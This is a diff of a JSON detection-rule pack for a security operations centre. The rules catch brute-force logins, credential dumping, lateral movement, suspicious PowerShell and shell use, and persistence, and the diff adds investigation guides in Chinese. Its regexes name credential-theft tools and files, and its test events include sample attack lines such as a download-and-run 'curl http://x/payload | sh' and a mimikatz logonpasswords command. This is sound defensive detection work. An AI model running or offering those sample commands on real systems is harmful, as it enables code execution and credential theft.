@@ -1,6 +1,6 @@
 {
   "packId": "socp-core-detections",
-  "version": "2026.08.30",
+  "version": "2026.09.13",
   "schemaVersion": "1",
   "maintainer": "socp-detection",
   "rules": [
@@ -10,9 +10,16 @@
       "status": "ACTIVE",
       "owner": "socp-detection",
       "description": "同一源 IP 在短时间内连续失败登录。",
-      "dataSources": ["auth", "sshd"],
-      "mitre": ["T1110"],
-      "references": ["https://attack.mitre.org/techniques/T1110/"],
+      "dataSources": [
+        "auth",
+        "sshd"
+      ],
+      "mitre": [
+        "T1110"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1110/"
+      ],
       "spec": {
         "id": "AUTH-BRUTE",
         "name": "SSH 暴力破解",
@@ -24,8 +31,16 @@
         "window": "60s",
         "mitre": "T1110",
         "match": [
-          {"field": "source", "op": "eq", "value": "auth"},
-          {"field": "msg", "op": "contains", "value": "Failed password"}
+          {
+            "field": "source",
+            "op": "eq",
+            "value": "auth"
+          },
+          {
+            "field": "msg",
+            "op": "contains",
+            "value": "Failed password"
+          }
         ]
       },
       "tests": [
@@ -33,23 +48,91 @@
           "name": "five failures trigger",
           "expectAlert": true,
           "events": [
-            {"source": "auth", "host": "ssh-1", "msg": "Failed password", "fields": {"src_ip": "198.51.100.10"}},
-            {"source": "auth", "host": "ssh-1", "msg": "Failed password", "fields": {"src_ip": "198.51.100.10"}},
-            {"source": "auth", "host": "ssh-1", "msg": "Failed password", "fields": {"src_ip": "198.51.100.10"}},
-            {"source": "auth", "host": "ssh-1", "msg": "Failed password", "fields": {"src_ip": "198.51.100.10"}},
-            {"source": "auth", "host": "ssh-1", "msg": "Failed password", "fields": {"src_ip": "198.51.100.10"}}
+            {
+              "source": "auth",
+              "host": "ssh-1",
+              "msg": "Failed password",
+              "fields": {
+                "src_ip": "198.51.100.10"
+              }
+            },
+            {
+              "source": "auth",
+              "host": "ssh-1",
+              "msg": "Failed password",
+              "fields": {
+                "src_ip": "198.51.100.10"
+              }
+            },
+            {
+              "source": "auth",
+              "host": "ssh-1",
+              "msg": "Failed password",
+              "fields": {
+                "src_ip": "198.51.100.10"
+              }
+            },
+            {
+              "source": "auth",
+              "host": "ssh-1",
+              "msg": "Failed password",
+              "fields": {
+                "src_ip": "198.51.100.10"
+              }
+            },
+            {
+              "source": "auth",
+              "host": "ssh-1",
+              "msg": "Failed password",
+              "fields": {
+                "src_ip": "198.51.100.10"
+              }
+            }
           ]
         },
         {
           "name": "four failures do not trigger",
           "expectAlert": false,
           "events": [
-            {"source": "auth", "host": "ssh-1", "msg": "Failed password", "fields": {"src_ip": "198.51.100.11"}},
-            {"source": "auth", "host": "ssh-1", "msg": "Failed password", "fields": {"src_ip": "198.51.100.11"}},
-            {"source": "auth", "host": "ssh-1", "msg": "Failed password", "fields": {"src_ip": "198.51.100.11"}},
-            {"source": "auth", "host": "ssh-1", "msg": "Failed password", "fields": {"src_ip": "198.51.100.11"}}
+            {
+              "source": "auth",
+              "host": "ssh-1",
+              "msg": "Failed password",
+              "fields": {
+                "src_ip": "198.51.100.11"
+              }
+            },
+            {
+              "source": "auth",
+              "host": "ssh-1",
+              "msg": "Failed password",
+              "fields": {
+                "src_ip": "198.51.100.11"
+              }
+            },
+            {
+              "source": "auth",
+              "host": "ssh-1",
+              "msg": "Failed password",
+              "fields": {
+                "src_ip": "198.51.100.11"
+              }
+            },
+            {
+              "source": "auth",
+              "host": "ssh-1",
+              "msg": "Failed password",
+              "fields": {
+                "src_ip": "198.51.100.11"
+              }
+            }
           ]
         }
+      ],
+      "investigationGuide": "1. 统计该源 IP 的目标账号分布与失败时间线，判断是定向爆破还是密码喷洒；\n2. 检查该 IP 是否已有成功登录记录（关联 AUTH-BRUTE-SUCCESS 告警）；\n3. 确认攻击后在边界封禁源 IP，并强制重置被尝试的目标账号凭据；\n4. 若来源为已登记的扫描器/红队出口，加入白名单并降级处理。",
+      "falsePositives": [
+        "可信漏洞扫描器或红队出口 IP 的例行认证测试",
+        "同一用户密码过期后的连续输错（目标账号单一且集中）"
       ]
     },
     {
@@ -58,9 +141,17 @@
       "status": "ACTIVE",
       "owner": "socp-detection",
       "description": "失败登录后同一源 IP 成功登录，形成攻击链。",
-      "dataSources": ["auth", "sshd"],
-      "mitre": ["T1110", "T1078"],
-      "references": ["https://attack.mitre.org/techniques/T1078/"],
+      "dataSources": [
+        "auth",
+        "sshd"
+      ],
+      "mitre": [
+        "T1110",
+        "T1078"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1078/"
+      ],
       "spec": {
         "id": "AUTH-BRUTE-SUCCESS",
         "name": "暴力破解得手（关联）",
@@ -71,8 +162,30 @@
         "window": "120s",
         "mitre": "T1078",
         "steps": [
-          [{"field": "source", "op": "eq", "value": "auth"}, {"field": "msg", "op": "contains", "value": "Failed password"}],
-          [{"field": "source", "op": "eq", "value": "auth"}, {"field": "msg", "op": "contains", "value": "Accepted password"}]
+          [
+            {
+              "field": "source",
+              "op": "eq",
+              "value": "auth"
+            },
+            {
+              "field": "msg",
+              "op": "contains",
+              "value": "Failed password"
+            }
+          ],
+          [
+            {
+              "field": "source",
+              "op": "eq",
+              "value": "auth"
+            },
+            {
+              "field": "msg",
+              "op": "contains",
+              "value": "Accepted password"
+            }
+          ]
         ]
       },
       "tests": [
@@ -80,17 +193,43 @@
           "name": "failure followed by success triggers",
           "expectAlert": true,
           "events": [
-            {"source": "auth", "host": "ssh-2", "msg": "Failed password", "fields": {"src_ip": "198.51.100.20"}},
-            {"source": "auth", "host": "ssh-2", "msg": "Accepted password", "fields": {"src_ip": "198.51.100.20"}}
+            {
+              "source": "auth",
+              "host": "ssh-2",
+              "msg": "Failed password",
+              "fields": {
+                "src_ip": "198.51.100.20"
+              }
+            },
+            {
+              "source": "auth",
+              "host": "ssh-2",
+              "msg": "Accepted password",
+              "fields": {
+                "src_ip": "198.51.100.20"
+              }
+            }
           ]
         },
         {
           "name": "success without failure does not trigger",
           "expectAlert": false,
           "events": [
-            {"source": "auth", "host": "ssh-2", "msg": "Accepted password", "fields": {"src_ip": "198.51.100.21"}}
+            {
+              "source": "auth",
+              "host": "ssh-2",
+              "msg": "Accepted password",
+              "fields": {
+                "src_ip": "198.51.100.21"
+              }
+            }
           ]
         }
+      ],
+      "investigationGuide": "1. 立即确认成功登录的账号、来源与后续会话是否合法（跳板机/自动化凭据轮换也会产生此序列）；\n2. 无法确认合法时冻结会话并重置该账号凭据；\n3. 排查登录之后的行为：新增公钥、提权、横向移动、持久化。\n4. 回溯同源 IP 的全部失败登录目标，评估波及账号范围。",
+      "falsePositives": [
+        "部署/CI 脚本使用旧凭据失败后自动切换新凭据",
+        "用户输错密码后自行纠正的正常登录"
       ]
     },
     {
@@ -99,9 +238,17 @@
       "status": "ACTIVE",
       "owner": "socp-detection",
       "description": "识别 sudo 或显式权限提升痕迹。",
-      "dataSources": ["auth", "auditd", "linux"],
-      "mitre": ["T1548"],
-      "references": ["https://attack.mitre.org/techniques/T1548/"],
+      "dataSources": [
+        "auth",
+        "auditd",
+        "linux"
+      ],
+      "mitre": [
+        "T1548"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1548/"
+      ],
       "spec": {
         "id": "AUTH-PRIVESC",
         "name": "权限提升",
@@ -109,19 +256,44 @@
         "severity": "CRITICAL",
         "message": "检测到权限提升行为：{msg} @ {host}",
         "mitre": "T1548",
-        "match": [{"field": "msg", "op": "regex", "value": "(?i)Privilege escalation|sudo:"}]
+        "match": [
+          {
+            "field": "msg",
+            "op": "regex",
+            "value": "(?i)Privilege escalation|sudo:"
+          }
+        ]
       },
       "tests": [
         {
           "name": "sudo command triggers",
           "expectAlert": true,
-          "events": [{"source": "auth", "host": "linux-1", "msg": "sudo: user executed /bin/sh", "fields": {}}]
+          "events": [
+            {
+              "source": "auth",
+              "host": "linux-1",
+              "msg": "sudo: user executed /bin/sh",
+              "fields": {}
+            }
+          ]
         },
         {
           "name": "ordinary login does not trigger",
           "expectAlert": false,
-          "events": [{"source": "auth", "host": "linux-1", "msg": "Accepted password", "fields": {}}]
+          "events": [
+            {
+              "source": "auth",
+              "host": "linux-1",
+              "msg": "Accepted password",
+              "fields": {}
+            }
+          ]
         }
+      ],
+      "investigationGuide": "1. 提取 sudo/提权命令行与目标账号，核对变更工单与授权范围；\n2. 确认操作者身份与会话来源（是否与历史运维习惯一致）；\n3. 排查提权后是否伴随持久化（PERSIST-*）或凭据访问（CRED-DUMP）。",
+      "falsePositives": [
+        "计划内运维变更与 sudo 授权调整",
+        "自动化部署/配置管理工具的常规提权"
       ]
     },
     {
@@ -130,9 +302,17 @@
       "status": "ACTIVE",
       "owner": "socp-detection",
       "description": "识别常见凭据转储工具和敏感凭据文件访问。",
-      "dataSources": ["edr", "auditd", "sysmon"],
-      "mitre": ["T1003"],
-      "references": ["https://attack.mitre.org/techniques/T1003/"],
+      "dataSources": [
+        "edr",
+        "auditd",
+        "sysmon"
+      ],
+      "mitre": [
+        "T1003"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1003/"
+      ],
       "spec": {
         "id": "CRED-DUMP",
         "name": "凭据转储",
@@ -140,19 +320,44 @@
         "severity": "CRITICAL",
         "message": "检测到凭据转储行为：{msg} @ {host}",
         "mitre": "T1003",
-        "match": [{"field": "msg", "op": "regex", "value": "(?i)mimikatz|lsass|sekurlsa|ntds|/etc/shadow"}]
+        "match": [
+          {
+            "field": "msg",
+            "op": "regex",
+            "value": "(?i)mimikatz|lsass|sekurlsa|ntds|/etc/shadow"
+          }
+        ]
       },
       "tests": [
         {
           "name": "mimikatz triggers",
           "expectAlert": true,
-          "events": [{"source": "edr", "host": "win-1", "msg": "mimikatz sekurlsa::logonpasswords", "fields": {}}]
+          "events": [
+            {
+              "source": "edr",
+              "host": "win-1",
+              "msg": "mimikatz sekurlsa::logonpasswords",
+              "fields": {}
+            }
+          ]
         },
         {
           "name": "normal process does not trigger",
           "expectAlert": false,
-          "events": [{"source": "edr", "host": "win-1", "msg": "explorer.exe started", "fields": {}}]
+          "events": [
+            {
+              "source": "edr",
+              "host": "win-1",
+              "msg": "explorer.exe started",
+              "fields": {}
+            }
+          ]
         }
+      ],
+      "investigationGuide": "1. 立即隔离主机，阻止凭据外传；\n2. 还原进程树，确认访问 lsass/shadow 等敏感凭据文件的进程与父进程；\n3. 假定凭据已泄露：轮换主机与域账号凭据并检查横向痕迹；\n4. 在同主机与同类主机上检索其他 T1003 痕迹。",
+      "falsePositives": [
+        "备份/合规巡检工具对影子文件或内存快照的合法读取",
+        "端点安全产品自身的凭据保护模块操作"
       ]
     },
     {
@@ -161,11 +366,62 @@
       "status": "ACTIVE",
       "owner": "socp-detection",
       "description": "Detect creation of a privileged local account.",
-      "dataSources": ["linux", "auditd"],
-      "mitre": ["T1098"],
-      "references": ["https://attack.mitre.org/techniques/T1098/"],
-      "spec": {"id": "AUTH-NEW-ADMIN", "name": "New privileged account", "type": "pattern", "severity": "HIGH", "message": "Privileged account change on {host}: {msg}", "mitre": "T1098", "match": [{"field": "msg", "op": "regex", "value": "(?i)(useradd|adduser).*(sudo|wheel|admin)|usermod.*(-aG|--append)"}]},
-      "tests": [{"name": "admin group account", "expectAlert": true, "events": [{"source": "auditd", "host": "linux-1", "msg": "useradd admin to sudo group", "fields": {}}]}, {"name": "normal account", "expectAlert": false, "events": [{"source": "auditd", "host": "linux-1", "msg": "useradd service-account", "fields": {}}]}]
+      "dataSources": [
+        "linux",
+        "auditd"
+      ],
+      "mitre": [
+        "T1098"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1098/"
+      ],
+      "spec": {
+        "id": "AUTH-NEW-ADMIN",
+        "name": "New privileged account",
+        "type": "pattern",
+        "severity": "HIGH",
+        "message": "Privileged account change on {host}: {msg}",
+        "mitre": "T1098",
+        "match": [
+          {
+            "field": "msg",
+            "op": "regex",
+            "value": "(?i)(useradd|adduser).*(sudo|wheel|admin)|usermod.*(-aG|--append)"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "admin group account",
+          "expectAlert": true,
+          "events": [
+            {
+              "source": "auditd",
+              "host": "linux-1",
+              "msg": "useradd admin to sudo group",
+              "fields": {}
+            }
+          ]
+        },
+        {
+          "name": "normal account",
+          "expectAlert": false,
+          "events": [
+            {
+              "source": "auditd",
+              "host": "linux-1",
+              "msg": "useradd service-account",
+              "fields": {}
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 核对 privileged 组变更加上新的管理员账号是否对应变更工单；\n2. 检查新账号的首次登录来源、时间与后续行为；\n3. 无法归属的账号立即禁用，并追溯创建该账号的会话。",
+      "falsePositives": [
+        "标准入职/角色变更流程创建的管理账号",
+        "账号生命周期系统按策略自动调整组归属"
+      ]
     },
     {
       "id": "AUTH-ROOT-LOGIN",
@@ -173,11 +429,67 @@
       "status": "ACTIVE",
       "owner": "socp-detection",
       "description": "Detect direct root authentication on managed hosts.",
-      "dataSources": ["auth", "sshd"],
-      "mitre": ["T1078"],
-      "references": ["https://attack.mitre.org/techniques/T1078/"],
-      "spec": {"id": "AUTH-ROOT-LOGIN", "name": "Direct root login", "type": "pattern", "severity": "HIGH", "message": "Root login on {host}: {msg}", "mitre": "T1078", "match": [{"field": "source", "op": "eq", "value": "auth"}, {"field": "msg", "op": "regex", "value": "(?i)(accepted|session opened).*root"}]},
-      "tests": [{"name": "root accepted", "expectAlert": true, "events": [{"source": "auth", "host": "linux-2", "msg": "Accepted password for root", "fields": {}}]}, {"name": "user accepted", "expectAlert": false, "events": [{"source": "auth", "host": "linux-2", "msg": "Accepted password for alice", "fields": {}}]}]
+      "dataSources": [
+        "auth",
+        "sshd"
+      ],
+      "mitre": [
+        "T1078"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1078/"
+      ],
+      "spec": {
+        "id": "AUTH-ROOT-LOGIN",
+        "name": "Direct root login",
+        "type": "pattern",
+        "severity": "HIGH",
+        "message": "Root login on {host}: {msg}",
+        "mitre": "T1078",
+        "match": [
+          {
+            "field": "source",
+            "op": "eq",
+            "value": "auth"
+          },
+          {
+            "field": "msg",
+            "op": "regex",
+            "value": "(?i)(accepted|session opened).*root"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "root accepted",
+          "expectAlert": true,
+          "events": [
+            {
+              "source": "auth",
+              "host": "linux-2",
+              "msg": "Accepted password for root",
+              "fields": {}
+            }
+          ]
+        },
+        {
+          "name": "user accepted",
+          "expectAlert": false,
+          "events": [
+            {
+              "source": "auth",
+              "host": "linux-2",
+              "msg": "Accepted password for alice",
+              "fields": {}
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 确认 root 直接登录是否符合该主机的运维基线（应经由堡垒机/sudo）；\n2. 核对会话来源地址、时长与执行的命令；\n3. 若基线不允许，禁用 root 远程登录并轮换凭据。",
+      "falsePositives": [
+        "救援模式或堡垒机的受控 root 登录",
+        "恢复作业期间的临时受控使用"
+      ]
     },
     {
       "id": "LATERAL-RDP",
@@ -185,11 +497,102 @@
       "status": "ACTIVE",
       "owner": "socp-detection",
       "description": "Repeated remote desktop attempts from one source.",
-      "dataSources": ["firewall", "windows"],
-      "mitre": ["T1021.001"],
-      "references": ["https://attack.mitre.org/techniques/T1021/001/"],
-      "spec": {"id": "LATERAL-RDP", "name": "RDP lateral movement", "type": "threshold", "severity": "HIGH", "message": "Source {key} made {count} RDP attempts in {window}", "keyField": "src_ip", "routingField": "src_ip", "threshold": 5, "window": "300s", "mitre": "T1021.001", "match": [{"field": "msg", "op": "regex", "value": "(?i)(rdp|mstsc|3389)"}]},
-      "tests": [{"name": "five RDP attempts", "expectAlert": true, "events": [{"source": "firewall", "host": "dc-1", "msg": "RDP connection to 3389", "fields": {"src_ip": "198.51.100.30"}}, {"source": "firewall", "host": "dc-2", "msg": "RDP connection to 3389", "fields": {"src_ip": "198.51.100.30"}}, {"source": "firewall", "host": "dc-3", "msg": "RDP connection to 3389", "fields": {"src_ip": "198.51.100.30"}}, {"source": "firewall", "host": "dc-4", "msg": "RDP connection to 3389", "fields": {"src_ip": "198.51.100.30"}}, {"source": "firewall", "host": "dc-5", "msg": "RDP connection to 3389", "fields": {"src_ip": "198.51.100.30"}}]}, {"name": "single RDP attempt", "expectAlert": false, "events": [{"source": "firewall", "host": "dc-1", "msg": "RDP connection to 3389", "fields": {"src_ip": "198.51.100.31"}}]}]
+      "dataSources": [
+        "firewall",
+        "windows"
+      ],
+      "mitre": [
+        "T1021.001"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1021/001/"
+      ],
+      "spec": {
+        "id": "LATERAL-RDP",
+        "name": "RDP lateral movement",
+        "type": "threshold",
+        "severity": "HIGH",
+        "message": "Source {key} made {count} RDP attempts in {window}",
+        "keyField": "src_ip",
+        "routingField": "src_ip",
+        "threshold": 5,
+        "window": "300s",
+        "mitre": "T1021.001",
+        "match": [
+          {
+            "field": "msg",
+            "op": "regex",
+            "value": "(?i)(rdp|mstsc|3389)"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "five RDP attempts",
+          "expectAlert": true,
+          "events": [
+            {
+              "source": "firewall",
+              "host": "dc-1",
+              "msg": "RDP connection to 3389",
+              "fields": {
+                "src_ip": "198.51.100.30"
+              }
+            },
+            {
+              "source": "firewall",
+              "host": "dc-2",
+              "msg": "RDP connection to 3389",
+              "fields": {
+                "src_ip": "198.51.100.30"
+              }
+            },
+            {
+              "source": "firewall",
+              "host": "dc-3",
+              "msg": "RDP connection to 3389",
+              "fields": {
+                "src_ip": "198.51.100.30"
+              }
+            },
+            {
+              "source": "firewall",
+              "host": "dc-4",
+              "msg": "RDP connection to 3389",
+              "fields": {
+                "src_ip": "198.51.100.30"
+              }
+            },
+            {
+              "source": "firewall",
+              "host": "dc-5",
+              "msg": "RDP connection to 3389",
+              "fields": {
+                "src_ip": "198.51.100.30"
+              }
+            }
+          ]
+        },
+        {
+          "name": "single RDP attempt",
+          "expectAlert": false,
+          "events": [
+            {
+              "source": "firewall",
+              "host": "dc-1",
+              "msg": "RDP connection to 3389",
+              "fields": {
+                "src_ip": "198.51.100.31"
+              }
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 确认源主机与登录账号是否具备横向访问授权（跳板/管理段）；\n2. 检查目标主机的登录结果与登录后进程；\n3. 与 LATERAL-SMB/EXEC-* 告警关联，判断是否成对出现；\n4. 未授权时隔离源主机并封锁目标 3389 入站。",
+      "falsePositives": [
+        "管理员经跳板的多主机例行运维",
+        "VDI/远程办公场景的正常 RDP 使用"
+      ]
     },
     {
       "id": "LATERAL-SMB",
@@ -197,11 +600,103 @@
       "status": "ACTIVE",
       "owner": "socp-detection",
       "description": "Repeated SMB or PsExec movement attempts.",
-      "dataSources": ["firewall", "windows", "edr"],
-      "mitre": ["T1021.002"],
-      "references": ["https://attack.mitre.org/techniques/T1021/002/"],
-      "spec": {"id": "LATERAL-SMB", "name": "SMB lateral movement", "type": "threshold", "severity": "HIGH", "message": "Source {key} made {count} SMB movement attempts", "keyField": "src_ip", "routingField": "src_ip", "threshold": 5, "window": "300s", "mitre": "T1021.002", "match": [{"field": "msg", "op": "regex", "value": "(?i)(smb|psexec|wmiexec|445)"}]},
-      "tests": [{"name": "SMB burst", "expectAlert": true, "events": [{"source": "edr", "host": "srv-1", "msg": "psexec SMB session", "fields": {"src_ip": "198.51.100.40"}}, {"source": "edr", "host": "srv-2", "msg": "psexec SMB session", "fields": {"src_ip": "198.51.100.40"}}, {"source": "edr", "host": "srv-3", "msg": "psexec SMB session", "fields": {"src_ip": "198.51.100.40"}}, {"source": "edr", "host": "srv-4", "msg": "psexec SMB session", "fields": {"src_ip": "198.51.100.40"}}, {"source": "edr", "host": "srv-5", "msg": "psexec SMB session", "fields": {"src_ip": "198.51.100.40"}}]}, {"name": "ordinary file share", "expectAlert": false, "events": [{"source": "edr", "host": "srv-1", "msg": "SMB file read", "fields": {"src_ip": "198.51.100.41"}}]}]
+      "dataSources": [
+        "firewall",
+        "windows",
+        "edr"
+      ],
+      "mitre": [
+        "T1021.002"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1021/002/"
+      ],
+      "spec": {
+        "id": "LATERAL-SMB",
+        "name": "SMB lateral movement",
+        "type": "threshold",
+        "severity": "HIGH",
+        "message": "Source {key} made {count} SMB movement attempts",
+        "keyField": "src_ip",
+        "routingField": "src_ip",
+        "threshold": 5,
+        "window": "300s",
+        "mitre": "T1021.002",
+        "match": [
+          {
+            "field": "msg",
+            "op": "regex",
+            "value": "(?i)(smb|psexec|wmiexec|445)"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "SMB burst",
+          "expectAlert": true,
+          "events": [
+            {
+              "source": "edr",
+              "host": "srv-1",
+              "msg": "psexec SMB session",
+              "fields": {
+                "src_ip": "198.51.100.40"
+              }
+            },
+            {
+              "source": "edr",
+              "host": "srv-2",
+              "msg": "psexec SMB session",
+              "fields": {
+                "src_ip": "198.51.100.40"
+              }
+            },
+            {
+              "source": "edr",
+              "host": "srv-3",
+              "msg": "psexec SMB session",
+              "fields": {
+                "src_ip": "198.51.100.40"
+              }
+            },
+            {
+              "source": "edr",
+              "host": "srv-4",
+              "msg": "psexec SMB session",
+              "fields": {
+                "src_ip": "198.51.100.40"
+              }
+            },
+            {
+              "source": "edr",
+              "host": "srv-5",
+              "msg": "psexec SMB session",
+              "fields": {
+                "src_ip": "198.51.100.40"
+              }
+            }
+          ]
+        },
+        {
+          "name": "ordinary file share",
+          "expectAlert": false,
+          "events": [
+            {
+              "source": "edr",
+              "host": "srv-1",
+              "msg": "SMB file read",
+              "fields": {
+                "src_ip": "198.51.100.41"
+              }
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 确认 PsExec/wmic 风格的远程服务创建或 admin$ 访问是否授权；\n2. 检查目标主机上的服务创建、进程与账号；\n3. 排查源主机是否已失陷（关联 C2-BEACON/EXFIL-LARGE/RARE-PROCESS）。",
+      "falsePositives": [
+        "软件分发/补丁推送工具经 SMB 的合法部署",
+        "文件服务器与备份代理的常规 SMB 流量"
+      ]
     },
     {
       "id": "EXEC-POWERSHELL",
@@ -209,11 +704,62 @@
       "status": "ACTIVE",
       "owner": "socp-detection",
       "description": "Encoded or downloaded PowerShell execution.",
-      "dataSources": ["sysmon", "edr"],
-      "mitre": ["T1059.001"],
-      "references": ["https://attack.mitre.org/techniques/T1059/001/"],
-      "spec": {"id": "EXEC-POWERSHELL", "name": "Suspicious PowerShell", "type": "pattern", "severity": "HIGH", "message": "Suspicious PowerShell on {host}: {msg}", "mitre": "T1059.001", "match": [{"field": "msg", "op": "regex", "value": "(?i)powershell.*(-enc|-encodedcommand|downloadstring|invoke-expression)"}]},
-      "tests": [{"name": "encoded PowerShell", "expectAlert": true, "events": [{"source": "sysmon", "host": "win-2", "msg": "powershell.exe -enc aGVsbG8=", "fields": {}}]}, {"name": "signed binary", "expectAlert": false, "events": [{"source": "sysmon", "host": "win-2", "msg": "powershell.exe -File backup.ps1", "fields": {}}]}]
+      "dataSources": [
+        "sysmon",
+        "edr"
+      ],
+      "mitre": [
+        "T1059.001"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1059/001/"
+      ],
+      "spec": {
+        "id": "EXEC-POWERSHELL",
+        "name": "Suspicious PowerShell",
+        "type": "pattern",
+        "severity": "HIGH",
+        "message": "Suspicious PowerShell on {host}: {msg}",
+        "mitre": "T1059.001",
+        "match": [
+          {
+            "field": "msg",
+            "op": "regex",
+            "value": "(?i)powershell.*(-enc|-encodedcommand|downloadstring|invoke-expression)"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "encoded PowerShell",
+          "expectAlert": true,
+          "events": [
+            {
+              "source": "sysmon",
+              "host": "win-2",
+              "msg": "powershell.exe -enc aGVsbG8=",
+              "fields": {}
+            }
+          ]
+        },
+        {
+          "name": "signed binary",
+          "expectAlert": false,
+          "events": [
+            {
+              "source": "sysmon",
+              "host": "win-2",
+              "msg": "powershell.exe -File backup.ps1",
+              "fields": {}
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 解码 -enc/-w hidden 命令行并审查实际行为；\n2. 对下载来源域名做信誉与归属核查；\n3. 检查父进程是否为办公应用（钓鱼投递链路）；\n4. 确认后隔离主机并检索同类命令行的其他主机。",
+      "falsePositives": [
+        "已登记的运维自动化脚本",
+        "端点安全产品自身的 PowerShell 采集/响应动作"
+      ]
     },
     {
       "id": "EXEC-SHELL",
@@ -221,11 +767,63 @@
       "status": "ACTIVE",
       "owner": "socp-detection",
       "description": "Shell execution through common interpreter abuse patterns.",
-      "dataSources": ["auditd", "edr", "falco"],
-      "mitre": ["T1059"],
-      "references": ["https://attack.mitre.org/techniques/T1059/"],
-      "spec": {"id": "EXEC-SHELL", "name": "Suspicious shell execution", "type": "pattern", "severity": "HIGH", "message": "Suspicious shell execution on {host}: {msg}", "mitre": "T1059", "match": [{"field": "msg", "op": "regex", "value": "(?i)(bash -c|sh -c|curl.*\\|.*sh|wget.*\\|.*sh)"}]},
-      "tests": [{"name": "pipe to shell", "expectAlert": true, "events": [{"source": "auditd", "host": "linux-3", "msg": "curl http://x/payload | sh", "fields": {}}]}, {"name": "normal shell", "expectAlert": false, "events": [{"source": "auditd", "host": "linux-3", "msg": "bash /opt/backup.sh", "fields": {}}]}]
+      "dataSources": [
+        "auditd",
+        "edr",
+        "falco"
+      ],
+      "mitre": [
+        "T1059"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1059/"
+      ],
+      "spec": {
+        "id": "EXEC-SHELL",
+        "name": "Suspicious shell execution",
+        "type": "pattern",
+        "severity": "HIGH",
+        "message": "Suspicious shell execution on {host}: {msg}",
+        "mitre": "T1059",
+        "match": [
+          {
+            "field": "msg",
+            "op": "regex",
+            "value": "(?i)(bash -c|sh -c|curl.*\\|.*sh|wget.*\\|.*sh)"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "pipe to shell",
+          "expectAlert": true,
+          "events": [
+            {
+              "source": "auditd",
+              "host": "linux-3",
+              "msg": "curl http://x/payload | sh",
+              "fields": {}
+            }
+          ]
+        },
+        {
+          "name": "normal shell",
+          "expectAlert": false,
+          "events": [
+            {
+              "source": "auditd",
+              "host": "linux-3",
+              "msg": "bash /opt/backup.sh",
+              "fields": {}
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 提取解释器类型、命令行参数与执行账号；\n2. 核对工单与变更窗口，确认是否授权操作；\n3. 排查是否伴随持久化、提权或外联；\n4. 确认为恶意时隔离主机并清除落地文件。",
+      "falsePositives": [
+        "CI/CD 与配置管理工具的合法 shell 调用",
+        "运维在变更窗口内的手动排障"
+      ]
     },
     {
       "id": "PERSIST-CRON",
@@ -233,11 +831,63 @@
       "status": "ACTIVE",
       "owner": "socp-detection",
       "description": "Cron persistence or systemd timer creation.",
-      "dataSources": ["auditd", "linux", "edr"],
-      "mitre": ["T1053.003"],
-      "references": ["https://attack.mitre.org/techniques/T1053/003/"],
-      "spec": {"id": "PERSIST-CRON", "name": "Cron persistence", "type": "pattern", "severity": "HIGH", "message": "Persistence change on {host}: {msg}", "mitre": "T1053.003", "match": [{"field": "msg", "op": "regex", "value": "(?i)(crontab -e|/etc/cron|systemd-run|timer)"}]},
-      "tests": [{"name": "crontab write", "expectAlert": true, "events": [{"source": "auditd", "host": "linux-4", "msg": "crontab -e added reverse shell", "fields": {}}]}, {"name": "cron daemon tick", "expectAlert": false, "events": [{"source": "linux", "host": "linux-4", "msg": "cron daemon started", "fields": {}}]}]
+      "dataSources": [
+        "auditd",
+        "linux",
+        "edr"
+      ],
+      "mitre": [
+        "T1053.003"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1053/003/"
+      ],
+      "spec": {
+        "id": "PERSIST-CRON",
+        "name": "Cron persistence",
+        "type": "pattern",
+        "severity": "HIGH",
+        "message": "Persistence change on {host}: {msg}",
+        "mitre": "T1053.003",
+        "match": [
+          {
+            "field": "msg",
+            "op": "regex",
+            "value": "(?i)(crontab -e|/etc/cron|systemd-run|timer)"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "crontab write",
+          "expectAlert": true,
+          "events": [
+            {
+              "source": "auditd",
+              "host": "linux-4",
+              "msg": "crontab -e added reverse shell",
+              "fields": {}
+            }
+          ]
+        },
+        {
+          "name": "cron daemon tick",
+          "expectAlert": false,
+          "events": [
+            {
+              "source": "linux",
+              "host": "linux-4",
+              "msg": "cron daemon started",
+              "fields": {}
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 审查新增 cron/systemd timer 的执行内容、账户与周期；\n2. 核对对应变更工单与配置基线；\n3. 未知条目立即禁用，并回溯文件写入来源（哪个进程/会话创建）。",
+      "falsePositives": [
+        "监控/备份等标准任务的例行安装",
+        "配置管理工具按基线下发的定时任务"
+      ]
     },
     {
       "id": "PERSIST-TASK",
@@ -245,11 +895,63 @@
       "status": "ACTIVE",
       "owner": "socp-detection",
       "description": "Windows scheduled task persistence.",
-      "dataSources": ["sysmon", "windows", "edr"],
-      "mitre": ["T1053.005"],
-      "references": ["https://attack.mitre.org/techniques/T1053/005/"],
-      "spec": {"id": "PERSIST-TASK", "name": "Scheduled task persistence", "type": "pattern", "severity": "HIGH", "message": "Scheduled task persistence on {host}: {msg}", "mitre": "T1053.005", "match": [{"field": "msg", "op": "regex", "value": "(?i)(schtasks.*(/create|create)|scheduled task.*created)"}]},
-      "tests": [{"name": "task create", "expectAlert": true, "events": [{"source": "sysmon", "host": "win-3", "msg": "schtasks /create /tn Update /tr powershell", "fields": {}}]}, {"name": "task run", "expectAlert": false, "events": [{"source": "sysmon", "host": "win-3", "msg": "scheduled task Update started", "fields": {}}]}]
+      "dataSources": [
